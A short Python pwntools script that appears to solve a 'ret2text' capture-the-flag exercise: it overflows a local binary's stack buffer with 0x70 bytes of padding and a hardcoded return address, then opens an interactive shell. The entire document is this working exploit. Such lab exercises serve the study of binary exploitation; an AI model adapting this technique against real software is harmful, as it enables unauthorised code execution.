from pwn import *
sh = process('./ret2text')
ret_add = 0x804863a
sh.sendline(flat('F' * 0x70, p32(ret_add)))
sh.interactive()
